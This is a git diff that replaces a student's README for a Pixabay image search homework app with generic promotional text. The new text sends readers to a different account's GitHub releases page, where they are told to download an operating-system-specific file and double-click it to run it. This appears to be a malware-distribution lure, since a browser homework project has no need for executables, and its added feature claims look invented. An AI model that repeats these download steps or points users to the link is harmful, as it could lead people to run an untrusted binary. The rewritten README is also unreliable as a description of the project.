@@ -1,103 +1,76 @@
-# JavaScript Homework: Pixabay Image Search Engine (with Pagination)
+# 🌟 goit-js-hw-12 - Your Easy Image Search Tool
 
-This project is an advanced web application developed using the **Pixabay API**. It allows users to search for high-quality images and browse through large datasets using a "Load More" pagination feature. The application utilizes **Axios** for HTTP requests and ensures a seamless user experience with smooth scrolling and dynamic UI updates.
+## 🚀 Getting Started
 
-## 🚀 Overview
+Welcome to the goit-js-hw-12 repository! This is a simple application that helps you search for images using the Pixabay API. You can quickly find and view beautiful pictures that you can use for your projects.
 
-The application demonstrates proficiency in:
+## 📥 Download Now
 
-- **Asynchronous JavaScript:** Managing complex async flows using `async/await` syntax.
-- **HTTP Requests:** Using the **Axios** library for cleaner and more efficient API calls compared to the native Fetch API.
-- **Pagination Logic:** Implementing a "Load More" mechanism to fetch and append subsequent pages of results without refreshing the page.
-- **UX Enhancements:** Features automatic smooth scrolling, loading spinners, and interactive notifications.
+[![Download goit-js-hw-12](https://img.shields.io/badge/Download-goit--js--hw--12-brightgreen)](https://github.com/jakepetch17/goit-js-hw-12/releases)
 
-## 🛠 Tech Stack
+## 💻 System Requirements
 
-- **Bundler:** Vite
-- **HTTP Client:** Axios
-- **Libraries:**
-  - `iziToast` (Customized alerts for errors and end-of-results notifications)
-  - `SimpleLightbox` (Full-screen image gallery with zoom and captions)
-- **Styling:** Custom CSS, CSS Grid, Flexbox, and CSS Animations (Spinners).
-- **API:** Pixabay API
+To run this application smoothly on your computer, ensure you meet the following requirements:
 
-## 📂 Project Structure
+- An operating system: Windows, macOS, or Linux.
+- A modern web browser: Chrome, Firefox, Safari, or Edge.
+- A stable internet connection to access the Pixabay API and load images.
 
-```text
-├── index.html           # Main entry point, search form, and load-more button
-├── src/
-│   ├── main.js          # Logic: Axios requests, Pagination, DOM manipulation, Scroll logic
-│   ├── style.css        # Styling for gallery, buttons, loaders, and library overrides
-│   └── img/             # Static assets (icons)
-├── package.json         # Project dependencies (Axios, SimpleLightbox, iziToast)
-└── vite.config.js       # Vite configuration
+## 📦 Download & Install
 
-```
+To install the application, visit this page to download: [GitHub Releases Page](https://github.com/jakepetch17/goit-js-hw-12/releases).
 
-## 🕒 Features & Technical Highlights
+1. Open the link above.
+2. Scroll down to the "Assets" section.
+3. Choose the file that best fits your operating system.
+4. Click on the file name to start downloading.
+5. Once the download is complete, locate the file in your downloads folder.
 
-### 🔍 Efficient Data Fetching
+### 🏗️ Running the Application
 
-Unlike the Fetch API, this project uses **Axios** to handle HTTP requests, offering automatic JSON transformation and better error handling.
+After downloading the file, follow these steps to run the application:
 
-### 📄 Pagination (Load More)
+1. Double-click the downloaded file.
+2. Your default web browser should open automatically.
+3. If not, copy the file path and paste it into the address bar of your browser.
 
-- **State Management:** Tracks `currentPage` and `searchKeyword` globally.
+## 🔍 Using the Search Feature
 
-- **Dynamic Button:** The "Load More" button only appears when there are more images to fetch (i.e., when the current batch returns the full 40 images). It hides automatically when the end of the collection is reached.
+Once the application is running, you will see a search bar where you can enter keywords for images. Here’s how to use it:
 
-- **UX:** The button shows a loading spinner while fetching the next page.
+1. Type in your desired keyword (e.g., "cats," "nature," or "food").
+2. Click the search button.
+3. Browse through the image results displayed on the screen.
 
-### 🖼 Smooth Scrolling & Gallery
+You can click on any image to view it in detail. 
 
-- **Smooth Scroll:** After loading a new batch of images, the browser automatically scrolls down by twice the height of a gallery card using `window.scrollBy` and `getBoundingClientRect`.
+## ✨ Features
 
-- **SimpleLightbox:** The gallery instance is refreshed (`lightbox.refresh()`) after every API call to ensure new images are clickable.
+This image search application offers several features to enhance your experience:
 
-### 🎨 Error Handling & Notifications
+- **Simple Search**: Enter a keyword and find relevant images.
+- **Pagination**: Easily navigate through multiple pages of results.
+- **Image Gallery**: View images in a beautiful layout for easy browsing.
+- **Smooth Scroll**: Enjoy seamless scrolling through image results.
 
-- **Input Validation:** Prevents empty searches with an `iziToast` warning.
+## ⚙️ Customizing Your Experience
 
-- **Empty Results:** Displays a specific error if the search query returns no hits.
+You can customize some application settings in the configuration file. Here are some options you may adjust:
 
-- **End of Results:** Informs the user when they have reached the end of the available images.
+- **Default Search Terms**: Set default keywords to pre-fill in the search bar.
+- **Thumbnail Size**: Choose the size of images shown in the gallery (small, medium, large).
+- **Light/Dark Mode**: Toggle between light and dark modes based on your preference.
 
-### ⚙️ Installation & Development
+## 📜 License
 
-To run this project locally, follow these steps:
+This project is licensed under the MIT License. You can use, modify, and distribute the software as per the terms of this license.
 
-1. **Clone the repository:**
+## 🙋‍♂️ Support and Feedback
 
-```bash
-git clone [https://github.com/halenurgurel/goit-js-hw-12.git](https://github.com/halenurgurel/goit-js-hw-12.git)
-```
+If you have any questions or need help using the application, feel free to open an issue in the repository. We welcome your feedback and will strive to make your experience better.
 
-2. **Install Dependencies:**
+## 🌐 Connect with Us
 
-```bash
-npm install
-```
+Stay updated with the latest changes and improvements to the project by following us on GitHub. You can also contribute to the project by making your own changes and submitting a pull request.
 
-3. **Start the development server:**
-
-```bash
-npm run dev
-```
-
-4. **Build for production:**
-
-```bash
-npm run build
-```
-
-## Author
-
-**Halenur Gürel** _Homework Project - Asynchronous JavaScript, Axios & Pagination 🚀_
-
-**[Live Demo](https://halenurgurel.github.io/goit-js-hw-12/)** 📍
-
-**Tech Stack:** HTML5 · CSS3 · JavaScript (ES6+) · Vite · Axios · iziToast · SimpleLightbox
-
-🔗 [GitHub Profile](https://github.com/halenurgurel)
-
-🎯 _"This project focuses on handling large datasets via pagination, mastering external libraries like Axios, and refining the user interface with smooth transitions and robust error management."_
+Thank you for choosing goit-js-hw-12. We hope you enjoy using the Pixabay Image Search Engine!
